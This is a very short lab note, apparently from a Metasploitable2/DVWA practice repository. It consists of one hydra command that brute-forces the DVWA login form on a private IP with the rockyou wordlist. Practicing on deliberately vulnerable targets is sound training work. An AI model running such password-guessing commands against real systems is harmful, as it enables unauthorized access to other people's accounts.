# VDI-Metasploitable2

## Metasploitable.vdi

hydra dvwa get USERS

```bash
  hydra -l admin -P /home/kali/rockyou.txt 192.168.15.28 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&:Login=Conecte-se"
```
